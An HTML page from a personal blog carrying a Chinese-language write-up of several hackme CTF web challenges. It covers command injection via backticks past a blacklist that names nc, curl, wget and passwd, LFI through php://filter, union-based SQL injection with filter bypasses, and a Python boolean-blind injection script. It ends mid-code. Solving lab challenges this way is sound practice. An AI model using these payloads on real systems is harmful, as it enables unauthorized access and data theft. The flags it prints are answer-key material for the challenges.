@@ -1,0 +1,693 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <!--
+ * @Description: In User Settings Edit
+ * @Author: your name
+ * @Date: 2019-08-06 15:45:42
+ * @LastEditTime: 2019-08-06 15:45:42
+ * @LastEditors: your name
+ -->
+<meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="description" content="playmood's Blog">
+
+
+    <meta name="keywords" content="playmood's Blog">
+
+
+<title>a | playmood&#39;s Blog</title>
+
+
+
+
+    <link rel="icon" href="/favicon.ico">
+
+
+
+<!--iconfonts-->
+<link rel="stylesheet" href="/fonts/iconfonts/iconfont.css">
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+
+
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/script.js"></script>
+    
+    <script src="/js/tocbot.min.js"></script>
+    
+
+
+
+
+
+
+
+    
+    
+        
+    
+
+
+<meta name="generator" content="Hexo 4.2.0"></head>
+<body>
+    <div class="wrapper">
+        
+<header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="header-logo"><a href="/">playmood&#39;s blog</a></div>
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="/archives">Archives</a>
+                
+                    <a class="menu-item" href="/category">Categories</a>
+                
+                    <a class="menu-item" href="/tag">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+                <a href="/friends/"><span class="icon iconfont icon-team"></span></a>
+                <a href="/books/index.html"><span class="icon iconfont icon-book"></span></a>
+                <a href="/search/"><span class="icon iconfont icon-search"></span></a>
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">playmood&#39;s blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="/archives">Archives</a>
+                
+                    <a class="menu-item" href="/category">Categories</a>
+                
+                    <a class="menu-item" href="/tag">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+        <div class="main">
+            <div class="container">
+    
+    
+    <div class="post-toc">
+    <div class="tocbot-list">
+    </div>
+    <div class="tocbot-list-menu">
+        <a class="tocbot-toc-expand" onclick="expand_toc()"><span class="iconfont icon-expand"></span>&nbsp;</a> 
+        <a onclick="go_top()"><span class="icon iconfont icon-arrowup"></span>&nbsp;</a> 
+        <a onclick="go_bottom()"><span class="icon iconfont icon-arrowdown"></span>&nbsp;</a>
+    </div>
+</div>
+
+<script>
+    document.ready(
+        function () {
+            tocbot.init({
+                tocSelector: '.tocbot-list',
+                contentSelector: '.post-content',
+                headingSelector: 'h1, h2, h3, h4, h5',
+                collapseDepth: 1,
+                orderedList: false,
+                scrollSmooth: true,
+            })
+        }
+    )
+
+    function expand_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 6,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "collapse_toc()");
+        b.innerHTML = "<span class=\"iconfont icon-collapse\"></span>&nbsp; "
+    }
+
+    function collapse_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 1,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "expand_toc()");
+        b.innerHTML = "<span class=\"iconfont icon-expand\"></span>&nbsp; "
+    }
+
+    function go_top() {
+        window.scrollTo(0, 0);
+    }
+
+    function go_bottom() {
+        window.scrollTo(0, document.body.scrollHeight);
+    }
+
+</script>
+    
+
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">a</h1>
+            <br />
+            
+            <div class="post-meta">
+                
+                <span class="iconfont icon-user"></span> <a itemprop="author" rel="author" href="/"
+                    style="font-weight: bold;">playmood</a>
+                &nbsp;
+
+                
+                <span class="post-time">
+                    <span class="iconfont icon-time-circle"> March 19, 2020
+                    </span>
+                    &nbsp;
+
+                    
+                        <span id="post-view"><span class="icon iconfont icon-eye"></span>
+                            <span id="busuanzi_value_page_pv"></span>
+                        </span>
+            </div>
+            
+        </header>
+
+        <div class="post-content">
+            <h2 id="Hackeme-CTF-writeup"><a href="#Hackeme-CTF-writeup" class="headerlink" title="Hackeme CTF writeup"></a>Hackeme CTF writeup</h2><h3 id="hide-and-seek"><a href="#hide-and-seek" class="headerlink" title="hide and seek"></a>hide and seek</h3><h4 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h4><p>Can you see me? I’m so close to you but you can’t see me.</p>
+<h4 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h4><p>直接查看源码即可得到 flag</p>
+<p><img src="/report_cybersecurity01_img/171.png" alt=""></p>
+<p>flag:<code>FLAG{0h U C meeeeeeeeeeeeeeeeeeee!}</code></p>
+<h3 id="homepage"><a href="#homepage" class="headerlink" title="homepage"></a>homepage</h3><h4 id="描述-1"><a href="#描述-1" class="headerlink" title="描述"></a>描述</h4><p>Where is the flag? Did you check the code?</p>
+<h4 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h4><p>注意到源代码第 217 行</p>
+<p><img src="/report_cybersecurity01_img/172.png" alt=""></p>
+<p>跟进<code>cute.js</code></p>
+<p><img src="/report_cybersecurity01_img/173.png" alt=""></p>
+<p>很明显的 aaencode，复制到控制台执行，得到二维码，扫描得到 flag</p>
+<p><img src="/report_cybersecurity01_img/174.png" alt=""></p>
+<p>flag:<code>FLAG{Oh, You found me!!!!!! Yeeeeeeee.}</code></p>
+<h3 id="ping"><a href="#ping" class="headerlink" title="ping"></a>ping</h3><h4 id="描述-2"><a href="#描述-2" class="headerlink" title="描述"></a>描述</h4><p>Can you ping 127.0.0.1?</p>
+<h4 id="思路-2"><a href="#思路-2" class="headerlink" title="思路"></a>思路</h4><p>打开题目，给出了输入框，通过 get 方法传递到服务器执行 ping 操作</p>
+<p>题目同时给出了后台源码，其中包括一个黑名单</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$blacklist = [</span><br><span class="line">            <span class="string">'flag'</span>, <span class="string">'cat'</span>, <span class="string">'nc'</span>, <span class="string">'sh'</span>, <span class="string">'cp'</span>, <span class="string">'touch'</span>, <span class="string">'mv'</span>, <span class="string">'rm'</span>, <span class="string">'ps'</span>, <span class="string">'top'</span>, <span class="string">'sleep'</span>, <span class="string">'sed'</span>,</span><br><span class="line">            <span class="string">'apt'</span>, <span class="string">'yum'</span>, <span class="string">'curl'</span>, <span class="string">'wget'</span>, <span class="string">'perl'</span>, <span class="string">'python'</span>, <span class="string">'zip'</span>, <span class="string">'tar'</span>, <span class="string">'php'</span>, <span class="string">'ruby'</span>, <span class="string">'kill'</span>,</span><br><span class="line">            <span class="string">'passwd'</span>, <span class="string">'shadow'</span>, <span class="string">'root'</span>,</span><br><span class="line">            <span class="string">'z'</span>,</span><br><span class="line">            <span class="string">'dir'</span>, <span class="string">'dd'</span>, <span class="string">'df'</span>, <span class="string">'du'</span>, <span class="string">'free'</span>, <span class="string">'tempfile'</span>, <span class="string">'touch'</span>, <span class="string">'tee'</span>, <span class="string">'sha'</span>, <span class="string">'x64'</span>, <span class="string">'g'</span>,</span><br><span class="line">            <span class="string">'xargs'</span>, <span class="string">'PATH'</span>,</span><br><span class="line">            <span class="string">'$0'</span>, <span class="string">'proc'</span>,</span><br><span class="line">            <span class="string">'/'</span>, <span class="string">'&amp;'</span>, <span class="string">'|'</span>, <span class="string">'&gt;'</span>, <span class="string">'&lt;'</span>, <span class="string">';'</span>, <span class="string">'"'</span>, <span class="string">'\''</span>, <span class="string">'\\'</span>, <span class="string">"\n"</span></span><br><span class="line">        ];</span><br></pre></td></tr></table></figure>
+
+<p>同时给出了后台命令的执行方法，将 get 方法得到的 id 进行黑名单过滤后直接代入 ping 命令执行</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec(<span class="string">"ping -c 1 \"&#123;$ip&#125;\" 2&gt;&amp;1"</span>, $ret);</span><br></pre></td></tr></table></figure>
+
+<p>由于黑名单中把单、双引号都过滤了，因此我们无法通过闭合引号的方法传入命令</p>
+<p>首先我们要知道的是，在 shell 中，反引号包裹的字符串将直接当做命令执行，而黑名单中并没有过滤反引号，同时我们发现 ls 命令也没有被过滤，因此尝试输入<code>ls</code></p>
+<p><img src="/report_cybersecurity01_img/116.png" alt=""></p>
+<p>返回了<code>flag.php</code>，flag 显然在里面，因此我们要想办法获取其中的值</p>
+<p>由于 cat、flag 等词被过滤，因此我们选择<code>sort + 通配符</code>来获取 flag，通配符选择 8 个问号来匹配<code>flag.php</code></p>
+<p>构造<code>sort ????????</code>即可得到 flag:<code>FLAG{ping_$(capture-the-flag)_UtUbtnvY5F9Hn5dR}</code></p>
+<p><img src="/report_cybersecurity01_img/117.png" alt=""></p>
+<h3 id="LFI"><a href="#LFI" class="headerlink" title="LFI"></a>LFI</h3><h4 id="描述-3"><a href="#描述-3" class="headerlink" title="描述"></a>描述</h4><p>What this admin’s password? That is not important at all, just get the flag.<br>Tips: LFI, <code>php://filter</code></p>
+<h4 id="思路-3"><a href="#思路-3" class="headerlink" title="思路"></a>思路</h4><p>查看网页源代码，发现提示</p>
+<p><img src="/report_cybersecurity01_img/118.png" alt=""></p>
+<p>直接访问<code>?page=pages/flag</code>，返回要我们想办法读取 flag，结合题目提示可以想到用<code>php://filter</code>来读取该页面源码</p>
+<p>构造<code>?page=php://filter/read=convert.base64-encode/resource=pages/flag</code>，返回如下</p>
+<p><img src="/report_cybersecurity01_img/119.png" alt=""></p>
+<p>base64 解码后为<code>Can you read the flag&lt;?php require(&#39;config.php&#39;); ?&gt;?</code></p>
+<p>告诉我们 flag 在 config 页面中</p>
+<p>因此再次对 config 页面进行读取，构造<code>?page=php://filter/read=convert.base64-encode/resource=pages/config</code></p>
+<p><img src="/report_cybersecurity01_img/120.png" alt=""></p>
+<p>对返回 base 解码得到 flag:<code>FLAG{Yoooooo_LFI_g00d_2cXxsXSYP9EVLrIo}</code></p>
+<h3 id="scoreboard"><a href="#scoreboard" class="headerlink" title="scoreboard"></a>scoreboard</h3><h4 id="描述-4"><a href="#描述-4" class="headerlink" title="描述"></a>描述</h4><p><strong>DO NOT</strong> ATTACK or SCAN scoreboard, you don’t need to do that.</p>
+<h4 id="思路-4"><a href="#思路-4" class="headerlink" title="思路"></a>思路</h4><p>发包，在响应头中找到了 flag:<code>FLAG{Header can hide some data aswell.}</code></p>
+<p><img src="/report_cybersecurity01_img/121.png" alt=""></p>
+<h3 id="guestbook"><a href="#guestbook" class="headerlink" title="guestbook"></a>guestbook</h3><h4 id="描述-5"><a href="#描述-5" class="headerlink" title="描述"></a>描述</h4><p>This guestbook sucks. sqlmap is your friend.</p>
+<h4 id="思路-5"><a href="#思路-5" class="headerlink" title="思路"></a>思路</h4><p>打开 message list</p>
+<p><img src="/report_cybersecurity01_img/122.png" alt=""></p>
+<p>进入 test，返回了 id=223 的数据</p>
+<p><img src="/report_cybersecurity01_img/123.png" alt=""></p>
+<p>猜想 id 参数可能存在 sql 注入，以其为数字型注入作如下尝试</p>
+<table>
+<thead>
+<tr>
+<th align="center">id=</th>
+<th align="center">返回</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center"><code>1</code></td>
+<td align="center">Sorry, no data for this</td>
+</tr>
+<tr>
+<td align="center"><code>1 or 1=1</code></td>
+<td align="center">与 id=223 返回结果一致</td>
+</tr>
+</tbody></table>
+<p>这就验证了我的猜想，可以利用数字型注入对数据库名、表名、字段名一一进行爆破</p>
+<p>构造<code>id=1 union select 1,2,3,database()#</code></p>
+<p>返回如下</p>
+<p><img src="/report_cybersecurity01_img/124.png" alt=""></p>
+<p>构造<code>id=1 union select 1,2,database(),4#</code></p>
+<p>返回如下</p>
+<p><img src="/report_cybersecurity01_img/125.png" alt=""></p>
+<p>这就说明数据库名为<code>g8</code></p>
+<p>接下来获取表名，构造<code>id=1 union select 1,2,(select table_name from information_schema.tables where table_schema = &#39;g8&#39; limit 0,1),4#</code></p>
+<p>返回表名为<code>flag</code></p>
+<p>接下来获取 flag 表中的字段，构造<code>id=1 union select 1,2,(select column_name from information_schema.columns where table_name = &#39;flag&#39; limit 0,1),4#</code></p>
+<p>返回第一个字段名为<code>id</code>，修改 limit 参数，得到下一个字段名为<code>flag</code></p>
+<p>因此构造最终 payload 来获取 flag</p>
+<p><code>id=1 union select 1,2,(select flag from flag limit 1,1),4#</code></p>
+<p>返回如下</p>
+<p><img src="/report_cybersecurity01_img/126.png" alt=""></p>
+<p>得到 flag</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FLAG&#123;Y0U_KN0W_SQL_1NJECT10N!!!&#39; or 595342&gt;123123#&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="login-as-admin-0"><a href="#login-as-admin-0" class="headerlink" title="login as admin 0"></a>login as admin 0</h3><h4 id="描述-6"><a href="#描述-6" class="headerlink" title="描述"></a>描述</h4><p>SQL Injection!</p>
+<h4 id="思路-6"><a href="#思路-6" class="headerlink" title="思路"></a>思路</h4><p>查看源码，找到过滤函数</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">safe_filter</span><span class="params">($str)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $strl = strtolower($str);</span><br><span class="line">    <span class="keyword">if</span> (strstr($strl, <span class="string">'or 1=1'</span>) || strstr($strl, <span class="string">'drop'</span>) ||</span><br><span class="line">        strstr($strl, <span class="string">'update'</span>) || strstr($strl, <span class="string">'delete'</span>)</span><br><span class="line">    ) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">''</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> str_replace(<span class="string">"'"</span>, <span class="string">"\\'"</span>, $str);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>关键就是要绕过这个函数，首先得要绕过<code>or 1=1</code>，很简单，改为<code>|| 1=1</code>即可</p>
+<p>然后就是要绕过<code>str_replace()</code>对单引号的转义，这个也不难，把单引号<code>&#39;</code>改为<code>\&#39;</code>即可</p>
+<p>故构造 user 为<code>admin\&#39; or 1=1#</code>，password 随便填</p>
+<p>登录后界面如下</p>
+<p><img src="/report_cybersecurity01_img/127.png" alt=""></p>
+<p>说明这第一个账户不是 admin 账户，利用<code>limit 1,1</code>取第二个账户即可</p>
+<p>构造<code>admin\&#39; || 1=1 limit 1,1#</code>得到 flag:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FLAG&#123;\&#39; UNION SELECT &quot;I Know SQL Injection&quot; #&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/report_cybersecurity01_img/128.png" alt=""></p>
+<h3 id="login-as-admin-0-1"><a href="#login-as-admin-0-1" class="headerlink" title="login as admin 0.1"></a>login as admin 0.1</h3><h4 id="描述-7"><a href="#描述-7" class="headerlink" title="描述"></a>描述</h4><p>Grab the hidden flag</p>
+<h4 id="思路-7"><a href="#思路-7" class="headerlink" title="思路"></a>思路</h4><p>这道题的源码和上道题一样，在上一题中，最后 flag 给出提示 flag2 in the database，说明这道题的 flag 需要到数据库中去寻找，那就开始愉快的 sql 注入吧~</p>
+<p>首先要做的当然是确定列，构造<code>name=admin\&#39; union select 1,2,3,4#&amp;password=1</code></p>
+<p>返回结果如下</p>
+<p><img src="/report_cybersecurity01_img/129.png" alt=""></p>
+<p>说明共有 4 列，且第 2 列会回显</p>
+<p>然后依次构造 payload</p>
+<p><code>name=admin\&#39; union select 1,database(),3,4#&amp;password=1</code>得到数据库名为 login_as_admin0</p>
+<p><code>name=admin\&#39; union select 1,(select table_name from information_schema.tables where table_schema=database() limit 0,1),3,4#&amp;password=1</code>找到了第一个表名为<code>h1dden_f14g</code>，猜测 flag 就在这个表中</p>
+<p>接下来对表中的字段进行搜寻</p>
+<p>构造<code>name=admin\&#39; union select 1,(select column_name from information_schema.columns where table_name=&#39;h1dden_f14g&#39; limit 0,1),3,4#&amp;password=1</code></p>
+<p>返回失败</p>
+<p><img src="/report_cybersecurity01_img/130.png" alt=""></p>
+<p>由于之前我们对表名查询返回正常，故猜测应该是 table_name 的名字不应该直接写出来，尝试将其转为 16 进制提交</p>
+<p>编写脚本如下</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">str_to_hex</span><span class="params">(s)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">''</span>.join([hex(ord(c)).replace(<span class="string">'0x'</span>, <span class="string">''</span>) <span class="keyword">for</span> c <span class="keyword">in</span> s])</span><br><span class="line">s = <span class="string">'h1dden_f14g'</span></span><br><span class="line">s = <span class="string">'0x'</span> + str_to_hex(s)</span><br><span class="line">print(s)</span><br></pre></td></tr></table></figure>
+
+<p>得到<code>h1dden_f14g</code>的 16 进制表示为<code>0x68316464656e5f66313467</code></p>
+<p>构造<code>name=admin\&#39; union select 1,(select column_name from information_schema.columns where table_name=0x68316464656e5f66313467 limit 0,1),3,4#&amp;password=1</code></p>
+<p>得到第一个字段名为 the_f14g</p>
+<p><img src="/report_cybersecurity01_img/131.png" alt=""></p>
+<p>flag 应该就是在这个字段里了，接下来获取字段中的值，构造<code>name=admin\&#39; union select 1,(select the_f14g from h1dden_f14g limit 0,1),3,4#&amp;password=1</code></p>
+<p>得到 flag:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FLAG&#123;Good, Union select is quite easy to exploit!&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/report_cybersecurity01_img/132.png" alt=""></p>
+<h3 id="login-as-admin-1"><a href="#login-as-admin-1" class="headerlink" title="login as admin 1"></a>login as admin 1</h3><h4 id="描述-8"><a href="#描述-8" class="headerlink" title="描述"></a>描述</h4><p>Please login as admin.<br>Tips: SQL Injection but <code>sqlmap</code> not working anymore.<br>Update: Source code is available now.<br>Scanner WON’T WORK</p>
+<h4 id="思路-8"><a href="#思路-8" class="headerlink" title="思路"></a>思路</h4><p>查看源码，获取关键的过滤函数如下</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">safe_filter</span><span class="params">($str)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $strl = strtolower($str);</span><br><span class="line">    <span class="keyword">if</span> (strstr($strl, <span class="string">' '</span>) || strstr($strl, <span class="string">'1=1'</span>) || strstr($strl, <span class="string">"''"</span>) ||</span><br><span class="line">        strstr($strl, <span class="string">'union select'</span>) || strstr($strl, <span class="string">'select '</span>)</span><br><span class="line">    ) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">''</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> str_replace(<span class="string">"'"</span>, <span class="string">"\\'"</span>, $str);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>首先这里过滤了空格，经过查询我了解到，在 mysql 中，解释器会把<code>/**/</code>解释为空格，故我们可以使用它来绕过空格的限制</p>
+<p>然后将<code>or 1=1</code> 修改为 <code>or 1</code>即可，最后需要绕过对单引号的替换，这个在上一题已经提到，在单引号前加一个转义符即可</p>
+<p>故构造 payload 如下</p>
+<p><code>name=\&#39;/**/or/**/1/**/limit/**/0,1#&amp;password=1</code></p>
+<p>返回 not admin 提示</p>
+<p><img src="/report_cybersecurity01_img/133.png" alt=""></p>
+<p>那么修改<code>limit 0, 1</code> 为<code>limit 1, 1</code></p>
+<p>得到 flag:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FLAG&#123;He110, Admin\\&#39; or 1337 &lt; 314159 #&#125;</span><br></pre></td></tr></table></figure>
+<p><img src="/report_cybersecurity01_img/134.png" alt=""></p>
+<h3 id="login-as-admin-1-2"><a href="#login-as-admin-1-2" class="headerlink" title="login as admin 1.2"></a>login as admin 1.2</h3><h4 id="描述-9"><a href="#描述-9" class="headerlink" title="描述"></a>描述</h4><p>Get another flag<br>Tips: boolean-based SQL injection, <code>information_schema</code></p>
+<h4 id="思路-9"><a href="#思路-9" class="headerlink" title="思路"></a>思路</h4><p>根据题目描述，本题应该是使用布尔盲注去解决</p>
+<p>利用上一题得到的 payload 编写脚本爆破如下逐一爆破数据库名、表名等等</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">myd = requests.session()</span><br><span class="line"></span><br><span class="line">header = &#123;</span><br><span class="line"></span><br><span class="line"><span class="string">"User-Agent"</span>:<span class="string">"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0"</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">url =<span class="string">"https://hackme.inndy.tw/login1/"</span></span><br><span class="line"></span><br><span class="line">true =<span class="string">"Hi"</span></span><br><span class="line"></span><br><span class="line">result =<span class="string">""</span></span><br><span class="line"></span><br><span class="line">count = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">250</span>):</span><br><span class="line"></span><br><span class="line">    print(<span class="string">"[+]...testing "</span> + str(x + <span class="number">1</span>))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> y <span class="keyword">in</span> range(<span class="number">32</span>, <span class="number">127</span>):</span><br><span class="line">        <span class="comment"># print(chr(j))</span></span><br><span class="line">        <span class="comment"># payload = "\\'or(ascii(mid((select database()),%s,1))=%s)#"%(i,j)</span></span><br><span class="line">        <span class="comment"># database() login_as_admin1</span></span><br><span class="line">        <span class="comment"># payload = "\\'or(ascii(mid((select table_name from information_schema.tables where table_schema=database() limit 1,1),%s,1))=%s)#"%(i,j)</span></span><br><span class="line">        <span class="comment"># table 0bdb54c98123f5526ccaed982d2006a9 users</span></span><br><span class="line">        <span class="comment"># payload = "\\'or(ascii(mid((select column_name from information_schema.columns where table_name=%%220bdb54c98123f5526ccaed982d2006a9%%22 limit 0,1),%s,1))=%s)#"%(i,j)</span></span><br><span class="line">        <span class="comment"># column  id 4a391a11cfa831ca740cf8d00782f3a6 name password isadmin</span></span><br><span class="line">        payload =<span class="string">"\\' or (ascii(mid((select group_concat(4a391a11cfa831ca740cf8d00782f3a6) from 0bdb54c98123f5526ccaed982d2006a9),%s,1))=%s)#"</span> % (x + <span class="number">1</span>, y)</span><br><span class="line"></span><br><span class="line">        payload = payload.replace(<span class="string">" "</span>, chr(<span class="number">0x0a</span>))</span><br><span class="line"></span><br><span class="line">        data = &#123;</span><br><span class="line"></span><br><span class="line">        <span class="string">"name"</span>: payload,</span><br><span class="line"></span><br><span class="line">        <span class="string">"password"</span>: <span class="number">123</span></span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        mys = myd.post(url, data=data, headers=header).text</span><br><span class="line">        <span class="keyword">if</span> true <span class="keyword">in</span> mys:</span><br><span class="line">            result = result + chr(y)</span><br><span class="line">            print(<span class="string">"the result is: "</span> + result)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        count = y</span><br><span class="line">        <span class="keyword">if</span> count == <span class="number">126</span>:</span><br><span class="line">            print(<span class="string">"[√]the result is: "</span> + result)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/report_cybersecurity01_img/135.png" alt=""></p>
+<p>最终的到 flag:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FLAG&#123;W0W, You found the correct table and the flag, and UserAgent&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="login-as-admin-3"><a href="#login-as-admin-3" class="headerlink" title="login as admin 3"></a>login as admin 3</h3><h4 id="描述-10"><a href="#描述-10" class="headerlink" title="描述"></a>描述</h4><p>login as admin</p>
+<h4 id="思路-10"><a href="#思路-10" class="headerlink" title="思路"></a>思路</h4><p>首先打开源码，对其进行审计，关键代码如下</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">set_user</span><span class="params">($user_data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">global</span> $user, $secret;</span><br><span class="line"></span><br><span class="line">    $user = [$user_data[<span class="string">'name'</span>], $user_data[<span class="string">'admin'</span>]];</span><br><span class="line"></span><br><span class="line">    $data = json_encode($user);</span><br><span class="line">    $sig = hash_hmac(<span class="string">'sha512'</span>, $data, $secret);</span><br><span class="line">    $all = base64_encode(json_encode([<span class="string">'sig'</span> =&gt; $sig, <span class="string">'data'</span> =&gt; $data]));</span><br><span class="line">    setcookie(<span class="string">'user'</span>, $all, time()+<span class="number">3600</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">load_user</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">global</span> $secret, $error;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">empty</span>($_COOKIE[<span class="string">'user'</span>])) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $unserialized = json_decode(base64_decode($_COOKIE[<span class="string">'user'</span>]), <span class="keyword">true</span>);</span><br><span class="line">    $r = hash_hmac(<span class="string">'sha512'</span>, $unserialized[<span class="string">'data'</span>], $secret) != $unserialized[<span class="string">'sig'</span>];</span><br><span class="line"></span><br><span class="line">    <span 